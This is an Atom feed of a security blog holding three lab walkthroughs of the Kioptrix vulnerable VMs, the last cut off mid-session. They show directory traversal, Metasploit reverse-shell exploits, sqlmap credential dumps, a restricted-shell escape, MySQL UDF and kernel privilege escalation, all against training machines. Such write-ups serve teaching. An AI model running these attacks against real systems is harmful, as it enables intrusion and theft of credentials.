<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: hacking | Core dump overflow]]></title>
  <link href="http://chousensha.github.io/blog/categories/hacking/atom.xml" rel="self"/>
  <link href="http://chousensha.github.io/"/>
  <updated>2014-07-03T19:59:31+03:00</updated>
  <id>http://chousensha.github.io/</id>
  <author>
    <name><![CDATA[chousensha]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Kioptrix 2014]]></title>
    <link href="http://chousensha.github.io/blog/2014/06/27/kioptrix-2014/"/>
    <updated>2014-06-27T19:01:09+03:00</updated>
    <id>http://chousensha.github.io/blog/2014/06/27/kioptrix-2014</id>
    <content type="html"><![CDATA[<p>Right when I thought I was finished with the Kioptrix vulnerable machines, I discovered there is a new addition to the series! This is great, because I really enjoyed the Kioptrix challenges! So let&rsquo;s dive in!</p>

<!-- more -->


<p>First, if you have problems with booting it up, check out the fix and instructions from <a href="http://vulnhub.com/entry/kioptrix_2014-5,62/">http://vulnhub.com/entry/kioptrix_2014-5,62/</a></p>

<p>Let&rsquo;s fire Nmap:</p>

<p>``` plain
nmap -A -p1-65535 192.168.127.130</p>

<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-06-27 19:14 EEST
Nmap scan report for 192.168.127.130
Host is up (0.0031s latency).
Not shown: 65532 filtered ports
PORT     STATE  SERVICE VERSION
22/tcp   closed ssh
80/tcp   open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)
| http-methods: Potentially risky methods: TRACE
|<em>See <a href="http://nmap.org/nsedoc/scripts/http-methods.html">http://nmap.org/nsedoc/scripts/http-methods.html</a>
|</em>http-title: Site doesn&rsquo;t have a title (text/html).
8080/tcp open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)
|<em>http-methods: No Allow or Public header in OPTIONS response (status code 403)
|</em>http-title: 403 Forbidden
MAC Address: 00:0C:29:BB:7C:98 (VMware)
Device type: general purpose
Running: FreeBSD 7.X|8.X|9.X
OS CPE: cpe:/o:freebsd:freebsd:7 cpe:/o:freebsd:freebsd:8 cpe:/o:freebsd:freebsd:9
OS details: FreeBSD 7.0-RELEASE &ndash; 9.0-RELEASE
```</p>

<p>Next I used the browser to check what is being hosted on ports 80 and 8080. On port 80 there is just an &ldquo;It works!&rdquo; message, and on port 8080 I got the Forbidden message. But on port 80&rsquo;s page source code, there is a comment revealing additional functionality:</p>

<p><code>html
&lt;META HTTP-EQUIV="refresh" CONTENT="5;URL=pChart2.1.3/index.php"&gt;
</code></p>

<p><img class="center" src="/images/pchart.png" title="&lsquo;pchart&rsquo; &lsquo;pchart&rsquo;" ></p>

<p>Searching for pChart reveals that this version is affected by <a href="http://www.exploit-db.com/exploits/31173/">directory traversal and XSS</a></p>

<p>So we can read any file that the web server is sufficiently privileged to read with the following string:</p>

<p><code>plain
http://192.168.127.130/pChart2.1.3/examples/index.php?Action=View&amp;Script=/../../etc/passwd
</code></p>

<p>In this case, there wasn&rsquo;t much information that could be of further use, and I wasn&rsquo;t able to read /etc/shadow, which was to be expected. Fortunately, the Apache configuration file is helpful. Since this is a FreeBSD system, the file is located in <code>/usr/local/etc/apache2x/httpd.conf</code> , <em>x</em> being the version number. At the moment, the only thing I could find interesting was this part at the very end of the file:</p>

<p>``` plain
SetEnvIf User-Agent ^Mozilla/4.0 Mozilla4_browser</p>

<p><VirtualHost *:8080></p>

<pre><code>DocumentRoot /usr/local/www/apache22/data2
</code></pre>

<p><Directory "/usr/local/www/apache22/data2"></p>

<pre><code>Options Indexes FollowSymLinks
AllowOverride All
Order allow,deny
Allow from env=Mozilla4_browser
</code></pre>

<p></Directory>
```</p>

<p>So it appears that a certain user agent receives special treatment! Let&rsquo;s verify this by changing the UA (I used the User Agent Switcher add-on for Firefox). And when I went to <a href="http://192.168.127.130:8080/">http://192.168.127.130:8080/</a> , there was a directory index for something called phptax! No more forbidden errors!</p>

<p><img class="center" src="/images/phptax.png" title="&lsquo;phptax&rsquo; &lsquo;phptax&rsquo;" ></p>

<p>So, <a href="http://sourceforge.net/projects/phptax/">the program</a> is used to generate PDFs. The good news (for us, not for the dilligent tax payers) is that it&rsquo;s <a href="http://www.exploit-db.com/exploits/21665/">vulnerable to remote code execution</a>, and there&rsquo;s also a Metasploit module available for it:</p>

<p><strong>PhpTax pfilez Parameter Exec Remote Code Injection</strong></p>

<blockquote><p>This module exploits a vulnerability found in PhpTax, an income tax report
generator. When generating a PDF, the icondrawpng() function in drawimage.php does
not properly handle the pfilez parameter, which will be used in a exec() statement,
and then results in arbitrary remote code execution
under the context of the web  server. Please note: authentication is not required to exploit this vulnerability.</p></blockquote>

<p>``` plain
msf > use exploit/multi/http/phptax_exec
msf exploit(phptax_exec) > show options</p>

<p>Module options (exploit/multi/http/phptax_exec):</p>

<p>   Name       Current Setting  Required  Description</p>

<hr />

<p>   Proxies                     no        Use a proxy chain
   RHOST                       yes       The target address
   RPORT      80               yes       The target port
   TARGETURI  /phptax/         yes       The path to the web application
   VHOST                       no        HTTP server virtual host</p>

<p>Exploit target:</p>

<p>   Id  Name</p>

<hr />

<p>   0   PhpTax 0.8</p>

<p>msf exploit(phptax_exec) > set RHOST 192.168.127.130
RHOST => 192.168.127.130
msf exploit(phptax_exec) > set RPORT 8080
RPORT => 8080
msf exploit(phptax_exec) > set payload cmd/unix/reverse
payload => cmd/unix/reverse
msf exploit(phptax_exec) > set LHOST 192.168.127.159
LHOST => 192.168.127.159
msf exploit(phptax_exec) > exploit</p>

<p>[<em>] Started reverse double handler
[</em>] 192.168.127.1308080 &ndash; Sending request&hellip;
[<em>] Accepted the first client connection&hellip;
[</em>] Accepted the second client connection&hellip;
[<em>] Command: echo ROZVUxzhMsI70Nsb;
[</em>] Writing to socket A
[<em>] Writing to socket B
[</em>] Reading from sockets&hellip;
[<em>] Reading from socket B
[</em>] B: &ldquo;ROZVUxzhMsI70Nsb\r\n&rdquo;
[<em>] Matching&hellip;
[</em>] A is input&hellip;
[<em>] Accepted the first client connection&hellip;
[</em>] Accepted the second client connection&hellip;
[<em>] Command: echo D6E80V1rZ169oQA6;
[</em>] Writing to socket A
[<em>] Writing to socket B
[</em>] Reading from sockets&hellip;
[<em>] Reading from socket A
[</em>] A: &ldquo;D6E80V1rZ169oQA6\r\n&rdquo;
[<em>] Matching&hellip;
[</em>] B is input&hellip;</p>

<p>whoami
www
```</p>

<p>We managed to break through. Now let&rsquo;s see how we can become root. I used <a href="http://www.exploit-db.com/exploits/26368/">this mmap/ptrace exploit</a></p>

<p>I downloaded it to my machine and served it on netcat, than I connected from the victim to the attacker machine and saved the file to the /tmp directory. From there, it was a matter of compiling it and running it:</p>

<p><code>plain
gcc -o exploit 26368.c
chmod a+x exploit
./exploit
whoami
root
</code></p>

<p>In the /root directory, there&rsquo;s another congrats.txt from loneferret:</p>

<p>``` plain
cat congrats.txt
If you are reading this, it means you got root (or cheated).
Congratulations either way&hellip;</p>

<p>Hope you enjoyed this new VM of mine. As always, they are made for the beginner in
mind, and not meant for the seasoned pentester. However this does not mean one
can&rsquo;t enjoy them.</p>

<p>As with all my VMs, besides getting &ldquo;root&rdquo; on the system, the goal is to also
learn the basics skills needed to compromise a system. Most importantly, in my mind,
are information gathering &amp; research. Anyone can throw massive amounts of exploits
and &ldquo;hope&rdquo; it works, but think about the traffic.. the logs&hellip; Best to take it
slow, and read up on the information you gathered and hopefully craft better
more targetted attacks.</p>

<p>For example, this system is FreeBSD 9. Hopefully you noticed this rather quickly.
Knowing the OS gives you any idea of what will work and what won&rsquo;t from the get go.
Default file locations are not the same on FreeBSD versus a Linux based distribution.
Apache logs aren&rsquo;t in &ldquo;/var/log/apache/access.log&rdquo;, but in &ldquo;/var/log/httpd-access.log&rdquo;.
It&rsquo;s default document root is not &ldquo;/var/www/&rdquo; but in &ldquo;/usr/local/www/apache22/data&rdquo;.
Finding and knowing these little details will greatly help during an attack. Of course
my examples are specific for this target, but the theory applies to all systems.</p>

<p>As a small exercise, look at the logs and see how much noise you generated. Of course
the log results may not be accurate if you created a snapshot and reverted, but at least
it will give you an idea. For fun, I installed &ldquo;OSSEC-HIDS&rdquo; and monitored a few things.
Default settings, nothing fancy but it should&rsquo;ve logged a few of your attacks. Look
at the following files:
/root/folderMonitor.log
/root/httpd-access.log (softlink)
/root/ossec-alerts.log (softlink)</p>

<p>The folderMonitor.log file is just a cheap script of mine to track created/deleted and modified
files in 2 specific folders. Since FreeBSD doesn&rsquo;t support &ldquo;iNotify&rdquo;, I couldn&rsquo;t use OSSEC-HIDS
for this.
The httpd-access.log is rather self-explanatory .
Lastly, the ossec-alerts.log file is OSSEC-HIDS is where it puts alerts when monitoring certain
files. This one should&rsquo;ve detected a few of your web attacks.</p>

<p>Feel free to explore the system and other log files to see how noisy, or silent, you were.
And again, thank you for taking the time to download and play.
Sincerely hope you enjoyed yourself.</p>

<p>Be good&hellip;</p>

<p>loneferret
<a href="http://www.kioptrix.com">http://www.kioptrix.com</a></p>

<p>p.s.: Keep in mind, for each &ldquo;web attack&rdquo; detected by OSSEC-HIDS, by
default it would&rsquo;ve blocked your IP (both in hosts.allow &amp; Firewall) for
600 seconds. I was nice enough to remove that part :)
```</p>

<p>This concludes the Kioptrix series, and cheers to <strong>loneferret</strong> for creating these awesome challenges!</p>

<blockquote><p>Today is the first day of the rest of the mess.</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - Kioptrix Level 4]]></title>
    <link href="http://chousensha.github.io/blog/2014/06/22/pentest-lab-kioptrix-level-4/"/>
    <updated>2014-06-22T22:39:14+03:00</updated>
    <id>http://chousensha.github.io/blog/2014/06/22/pentest-lab-kioptrix-level-4</id>
    <content type="html"><![CDATA[<p>This is the final vulnerable machine in the Kioptrix series. To set it up in VMware, create a new virtual machine with the advanced options and use existing virtual disk, pointing it at the Kioptrix 4 virtual disk.</p>

<!-- more -->


<p>Let&rsquo;s see what Nmap reveals:</p>

<p>``` plain
nmap -A -p1-65535 192.168.127.129</p>

<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-06-22 22:35 EEST
Nmap scan report for 192.168.127.129
Host is up (0.00074s latency).
Not shown: 39528 closed ports, 26003 filtered ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey:
|   1024 9b:ad:4f:f2:1e:c5:f2:39:14:b9:d3:a0:0b:e8:41:71 (DSA)
|<em>  2048 85:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e (RSA)
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
|</em>http-methods: No Allow or Public header in OPTIONS response (status code 200)
|_http-title: Site doesn&rsquo;t have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
MAC Address: 00:0C:29:1F:12:65 (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 &ndash; 2.6.33
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>

<p>Host script results:
|<em>nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Unix (Samba 3.0.28a)
|   Computer name: Kioptrix4
|   NetBIOS computer name:
|   Domain name: localdomain
|   FQDN: Kioptrix4.localdomain
|</em>  System time: 2014-06-22T18:36:57-04:00
| smb-security-mode:
|   Account that was used for smb scripts: guest
|   User-level authentication
|   SMB Security: Challenge/response passwords supported
|<em>  Message signing disabled (dangerous, but default)
|</em>smbv2-enabled: Server doesn&rsquo;t support SMBv2 protocol
```</p>

<p>Again, this seems to be a web based challenge. Navigating to the target website shows this:</p>

<p><img class="center" src="/images/kio4.png" title="&lsquo;login&rsquo; &lsquo;login&rsquo;" ></p>

<p>Supplying a single quote in the password field gives an error, which nicely discloses the database end as being MySQL:</p>

<p><em>Warning: mysql_num_rows(): supplied argument is not a valid MySQL result resource in /var/www/checklogin.php on line 28
Wrong Username or Password</em></p>

<p>Sqlmap to the rescue!</p>

<p>``` plain
sqlmap -u &ldquo;<a href="http://192.168.127.129/checklogin.php">http://192.168.127.129/checklogin.php</a>&rdquo; &mdash;dbms=MySQL &mdash;level=5 &mdash;risk=3 &mdash;data=&ldquo;myusername=admin&amp;mypassword=test&rdquo; &mdash;dump</p>

<p>Database: members
Table: members
[2 entries]
+&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
| id | username | password              |
+&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
| 1  | john     | MyNameIsJohn          |
| 2  | robert   | ADGAdsafdfwt4gadfga== |
+&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
```</p>

<p>Logging in with these credentials didn&rsquo;t yield anything though, all I could see was a member&rsquo;s control panel with no functionality. So I remembered the previous challenge that allowed SSH access, and tried to log in:</p>

<p><code>plain
root@kali:~# ssh john@192.168.127.129
The authenticity of host '192.168.127.129 (192.168.127.129)' can't be established.
RSA key fingerprint is 85:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.127.129' (RSA) to the list of known hosts.
john@192.168.127.129's password:
Welcome to LigGoat Security Systems - We are Watching
== Welcome LigGoat Employee ==
LigGoat Shell is in place so you  don't screw up
Type '?' or 'help' to get the list of allowed commands
john:~$
</code></p>

<p>Excellent! It&rsquo;s time for some sniffing around. This is not a normal shell, usual commands don&rsquo;t work, so let&rsquo;s see what&rsquo;s available with the help system.</p>

<p><code>plain
john:~$ help
cd  clear  echo  exit  help  ll  lpath  ls
</code></p>

<p>Hmm, not much. Actions are restricted too, can&rsquo;t <em>cd</em> to wherever I want:</p>

<p><code>plain
john:~$ cd /
*** forbidden path -&gt; "/"
*** You have 0 warning(s) left, before getting kicked out.
This incident has been reported.
</code></p>

<p>So I googled for a bit, and it appears this shell is a Python based limited shell (<a href="https://github.com/ghantoos/lshell">https://github.com/ghantoos/lshell</a>):</p>

<blockquote><p>lshell is a shell coded in Python, that lets you restrict a user&rsquo;s environment to limited sets of commands, choose to enable/
disable any command over SSH (e.g. SCP, SFTP, rsync, etc.), log user&rsquo;s commands, implement timing restriction, and more.</p></blockquote>

<p>It is possible to escape from this shell by leveraging the <em>echo</em> command to call <em>os.system</em> in order to spawn a shell: <code>echo os.system(&lsquo;/bin/bash&rsquo;)</code></p>

<p><code>plain
john:~$ echo os.system('/bin/bash')
john@Kioptrix4:~$ id
uid=1001(john) gid=1001(john) groups=1001(john)
</code></p>

<p>Poking around, I found the following information in <code>/var/www/john/john.php</code>:</p>

<p><code>plain
$host="localhost"; // Host name
$username="root"; // Mysql username
$password=""; // Mysql password
</code></p>

<p>So, root doesn&rsquo;t have a password for MySQL? Let&rsquo;s check:</p>

<p>``` plain
john@Kioptrix4:/var/www/john$ mysql -u root -h localhost
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 8
Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)</p>

<p>Type &lsquo;help;&rsquo; or &lsquo;\h&rsquo; for help. Type &lsquo;\c&rsquo; to clear the buffer.
```</p>

<p><a href="http://www.iodigitalsec.com/mysql-root-to-system-root-with-udf-for-windows-and-linux/">Here</a> I have found a way to get root privileges from a MySQL server running as root. Here&rsquo;s a quick summary:</p>

<ul>
<li><p>It is possible to escalate from MySQL server root level to system root by using User Defined Functions (UDF)</p></li>
<li><p>We need the <a href="https://github.com/mysqludf/lib_mysqludf_sys">lib_mysqludf_sys.so</a> library that contains some useful functions that can interact with the OS. The most important ones are <strong>sys_exec</strong> (executes the command and returns the exit status) and <strong>sys_eval</strong> (executes the command and returns the standard output)</p></li>
</ul>


<p>The next step would be to find a way to get the library on the machine with our MySQL server. But that&rsquo;s not necessary in this case, because it&rsquo;s already on the server!</p>

<p><code>plain
john@Kioptrix4:~$ whereis lib_mysqludf_sys.so
lib_mysqludf_sys: /usr/lib/lib_mysqludf_sys.so
</code></p>

<p>It took a bit of googling and trial and error until I found a way that worked in getting me to a root shell. <a href="http://superuser.com/questions/400723/how-do-i-create-a-superuser-from-the-command-line-in-ubuntu">Here</a> is a useful post. The relevant part for us is this:</p>

<blockquote><p>Until Ubuntu 11.10, the Unix group for administrators with root privileges through sudo had been admin. Starting with Ubuntu
12.04  LTS, it is now sudo, for compatibility with Debian and sudo itself. However, for backwards compatibility, admin group
members are still recognized as administrators</p></blockquote>

<p>So it is possible to make the john account to be part of the admin group, that is equivalent to the sudo group. So from the MySQL prompt, run this:</p>

<p><code>sql
SELECT sys_exec('usermod -a -G admin');
</code></p>

<p>What that does is it modifies john&rsquo;s account, appending it to the admin group. So let&rsquo;s do it on the MySQL command line:</p>

<p><code>sql
mysql&gt; select sys_exec('usermod -a -G admin john');
+--------------------------------------+
| sys_exec('usermod -a -G admin john') |
+--------------------------------------+
| NULL                                 |
+--------------------------------------+
1 row in set (0.11 sec)
</code></p>

<p>Now from john&rsquo;s shell:</p>

<p><code>plain
john@Kioptrix4:~$ sudo su
[sudo] password for john:
root@Kioptrix4:/home/john# whoami
root
</code></p>

<p>Awesome! We finally got root access! In root&rsquo;s directory there is another </code>congrats.txt</code> file that tells us there are at least 2 different tested ways to get root on this system. It sure was an interesting machine, and my favorite in the series, because it wasn&rsquo;t as straightforward as the others, and I had to look for more information and try (and fail) different approaches before I hit upon the winning one.</p>

<p>Here&rsquo;s today&rsquo;s fortune cookie:</p>

<blockquote><p>You single-handedly fought your way into this hopeless mess.</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - Kioptrix Level 3]]></title>
    <link href="http://chousensha.github.io/blog/2014/06/20/pentest-lab-kioptrix-level-3/"/>
    <updated>2014-06-20T23:53:34+03:00</updated>
    <id>http://chousensha.github.io/blog/2014/06/20/pentest-lab-kioptrix-level-3</id>
    <content type="html"><![CDATA[<p>Next in the Kioptrix series is level 3.</p>

<p><strong>Important</strong></p>

<p>With the VM there is a README.txt file that says you should update your hosts file with the VM&rsquo;s IP and hostname, which is <em>kioptrix3.com</em>. I initially ignored it and on the gallery page, all I could see were some broken images and links that didn&rsquo;t work. I went back and added the entry to my <code>/etc/hosts</code> file, and everything worked fine afterwards.</p>

<!-- more -->


<p>Start by checking out what&rsquo;s being exposed with Nmap:</p>

<p>``` plain
nmap -A -p1-65535 192.168.127.128</p>

<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-06-20 23:56 EEST
Nmap scan report for 192.168.127.128
Host is up (0.00039s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey:
|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)
|<em>  2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
|</em>http-methods: No Allow or Public header in OPTIONS response (status code 200)
|_http-title: Ligoat Security &ndash; Got Goat? Security &hellip;
MAC Address: 00:0C:29:07:4F:A9 (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 &ndash; 2.6.33
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```</p>

<p>Let&rsquo;s take a look at what&rsquo;s hosted on the web server. It appears to be a site with a blog page, a gallery and what appears to be an admin login page:</p>

<p><img class="center" src="/images/lotus_cms.png" title="&lsquo;admin login&rsquo; &lsquo;login&rsquo;" ></p>

<p>I tried running a sqlmap scan against it, with no success. Next, I thought maybe there might be something about the LotusCMS that powers up the site. It turns out there&rsquo;s a remote execution exploit available in Metasploit:</p>

<p><strong>LotusCMS 3.0 eval() Remote Command Execution</strong></p>

<blockquote><p>This module exploits a vulnerability found in Lotus CMS 3.0&rsquo;s Router() function. This is done by embedding PHP code in the &lsquo;page&rsquo; parameter,
which will be passed to a eval call, therefore allowing remote code execution. The module can either automatically pick up a &lsquo;page&rsquo; parameter
from the default page, or manually specify one in the URI option. To use the automatic method, please supply the URI with just a directory path,
for example: &ldquo;/lcms/&rdquo;. To manually configure one, you may do: &ldquo;/lcms/somepath/index.php?page=index&rdquo;</p></blockquote>

<p>``` plain
msf > use exploit/multi/http/lcms_php_exec
msf exploit(lcms_php_exec) > show options</p>

<p>Module options (exploit/multi/http/lcms_php_exec):</p>

<p>   Name     Current Setting  Required  Description</p>

<hr />

<p>   Proxies                   no        Use a proxy chain
   RHOST                     yes       The target address
   RPORT    80               yes       The target port
   URI      /lcms/           yes       URI
   VHOST                     no        HTTP server virtual host</p>

<p>Exploit target:</p>

<p>   Id  Name</p>

<hr />

<p>   0   Automatic LotusCMS 3.0</p>

<p>msf exploit(lcms_php_exec) > set RHOST 192.168.127.128
RHOST => 192.168.127.128
msf exploit(lcms_php_exec) > set payload generic/shell_reverse_tcp
payload => generic/shell_reverse_tcp
msf exploit(lcms_php_exec) > set LHOST 192.168.127.159
LHOST => 192.168.127.159
msf exploit(lcms_php_exec) > set URI /
URI => /
msf exploit(lcms_php_exec) > exploit</p>

<p>[<em>] Started reverse handler on 192.168.127.159:4444
[</em>] Using found page param: /index.php?page=index
[<em>] Sending exploit &hellip;
[</em>] Command shell session 1 opened (192.168.127.159:4444 &ndash;> 192.168.127.128:40623) at 2014-06-22 00:37:23 +0300
whoami</p>

<p>www-data
```</p>

<p>So we have a shell. I could not find a local privilege escalation exploit right away, so I instead started exploring the system.</p>

<p><code>plain
pwd
/home/www/kioptrix3.com
ls -l
total 84
drwxrwxrwx  2 root root  4096 Apr 15  2011 cache
drwxrwxrwx  8 root root  4096 Apr 14  2011 core
drwxrwxrwx  8 root root  4096 Apr 14  2011 data
-rw-r--r--  1 root root 23126 Jun  5  2009 favicon.ico
drwxr-xr-x  7 root root  4096 Apr 14  2011 gallery
-rw-r--r--  1 root root 26430 Jan 21  2007 gnu-lgpl.txt
-rw-r--r--  1 root root   399 Feb 23  2011 index.php
drwxrwxrwx 10 root root  4096 Apr 14  2011 modules
drwxrwxrwx  3 root root  4096 Apr 14  2011 style
-rw-r--r--  1 root root   243 Aug  5  2010 update.php
</code></p>

<p>The gallery directory looks interesting, so I looked inside:</p>

<p><code>plain
cd gallery
ls -l
total 156
drwxr-xr-x 2 root root  4096 Apr 12  2011 BACK
-rw-r--r-- 1 root root  3573 Oct 10  2009 db.sql
-rw-r--r-- 1 root root   252 Apr 12  2011 g.php
drwxr-xr-x 3 root root  4096 Apr 12  2011 gadmin
-rw-r--r-- 1 root root   214 Apr 12  2011 gallery.php
-rw-r--r-- 1 root root  1440 Apr 14  2011 gconfig.php
-rw-r--r-- 1 root root   297 Apr 12  2011 gfooter.php
-rw-r--r-- 1 root root 38771 Apr 12  2011 gfunctions.php
-rw-r--r-- 1 root root  1009 Apr 12  2011 gheader.php
-rw-r--r-- 1 root root   249 Apr 12  2011 index.php
-rw-r--r-- 1 root root 10340 Apr 12  2011 install.BAK
-rw-r--r-- 1 root root   212 Apr 12  2011 login.php
-rw-r--r-- 1 root root   213 Apr 12  2011 logout.php
-rw-r--r-- 1 root root   249 Apr 12  2011 p.php
drwxrwxrwx 2 root root  4096 Apr 12  2011 photos
-rw-r--r-- 1 root root   213 Apr 12  2011 photos.php
-rw-r--r-- 1 root root   219 Apr 12  2011 post_comment.php
-rw-r--r-- 1 root root   214 Apr 12  2011 profile.php
-rw-r--r-- 1 root root    87 Oct 10  2009 readme.html
-rw-r--r-- 1 root root   213 Apr 12  2011 recent.php
-rw-r--r-- 1 root root   215 Apr 12  2011 register.php
drwxr-xr-x 2 root root  4096 Apr 13  2011 scopbin
-rw-r--r-- 1 root root   213 Apr 12  2011 search.php
-rw-r--r-- 1 root root   216 Apr 12  2011 slideshow.php
-rw-r--r-- 1 root root   211 Apr 12  2011 tags.php
drwxr-xr-x 6 root root  4096 Apr 12  2011 themes
-rw-r--r-- 1 root root    56 Oct 10  2009 version.txt
-rw-r--r-- 1 root root   211 Apr 12  2011 vote.php
</code></p>

<p>So, there&rsquo;s all the source code for the gallery. I checked the files that looked interesting until I came upon a hit on the <code>gconfig.php</code> file, which contains the sort of information we need:</p>

<p>``` plain
/*</p>

<pre><code>A sample Gallarific configuration file. You should edit
the installer details below and save this file as gconfig.php
Do not modify anything else if you don't know what it is.
</code></pre>

<p>*/</p>

<pre><code>$GLOBALS["gallarific_path"] = "http://kioptrix3.com/gallery";

$GLOBALS["gallarific_mysql_server"] = "localhost";
$GLOBALS["gallarific_mysql_database"] = "gallery";
$GLOBALS["gallarific_mysql_username"] = "root";
$GLOBALS["gallarific_mysql_password"] = "fuckeyou";
</code></pre>

<p>```</p>

<p>I tried SSHing to the box with these credentials and also elevating privileges with su, but that would have been too easy. So more digging in the Php source code. The <code>gfunctions.php</code> file contains a plethora of information, among which there are some table and column names. There might be more information in the Php files but I didn&rsquo;t have the patience to go through all of them.</p>

<p>Back at the gallery, we can see some sorting options:</p>

<p><img class="center" src="/images/sort.png" title="&lsquo;sort options&rsquo; &lsquo;sort&rsquo;" ></p>

<p>Changing the sort filter to <em>photo id</em> makes the URL look like this:</p>

<p><code><a href="http://kioptrix3.com/gallery/gallery.php?id=1&amp;sort=photoid#photos">http://kioptrix3.com/gallery/gallery.php?id=1&amp;sort=photoid#photos</a></code></p>

<p>And if I replace the <code>id=1</code> part with <code>id=&lsquo;</code>, the site spits back a SQL error:</p>

<p><em>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &lsquo;&rsquo; order by parentid,sort,name' at line 1Could not select category</em></p>

<p>Now that I know SQLi is possible, it&rsquo;s time to fire sqlmap again!</p>

<p>``` plain
sqlmap -u &ldquo;<a href="http://kioptrix3.com/gallery/gallery.php?id=1&amp;sort=photoid#photos">http://kioptrix3.com/gallery/gallery.php?id=1&amp;sort=photoid#photos</a>&rdquo; &mdash;dbms=MySQL &mdash;level=5 &mdash;risk=3 &mdash;dump</p>

<p>Database: gallery
Table: dev_accounts
[2 entries]
+&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
| id | username   | password                         |
+&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
| 1  | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 |
| 2  | loneferret | 5badcaf789d3d1d09794d8f021f40f0e |
+&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+</p>

<p>```</p>

<p>It was a bit overkill to dump so much information, but I only show here the important bits. To crack the hashes, I used the <a href="http://www.hashkiller.co.uk/">http://www.hashkiller.co.uk/</a> site:</p>

<p>dreg&rsquo;s password: Mast3r</p>

<p>loneferret&rsquo;s password: starwars</p>

<p>Thankfully, these credentials work for SSH login, so I could get rid of the Metasploit shell which kept throwing EOF errors if I didn&rsquo;t interact with it for a while.</p>

<p>``` plain
ssh <a href="&#x6d;&#x61;&#105;&#108;&#116;&#111;&#58;&#x6c;&#111;&#110;&#101;&#102;&#101;&#x72;&#x72;&#x65;&#x74;&#x40;&#107;&#105;&#111;&#112;&#x74;&#x72;&#x69;&#x78;&#x33;&#46;&#x63;&#111;&#x6d;">&#108;&#x6f;&#x6e;&#101;&#x66;&#x65;&#x72;&#114;&#x65;&#x74;&#64;&#x6b;&#x69;&#111;&#x70;&#116;&#x72;&#105;&#120;&#x33;&#46;&#99;&#111;&#109;</a>
The authenticity of host &lsquo;kioptrix3.com (192.168.127.128)&rsquo; can&rsquo;t be established.
RSA key fingerprint is 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added &lsquo;kioptrix3.com&rsquo; (RSA) to the list of known hosts.
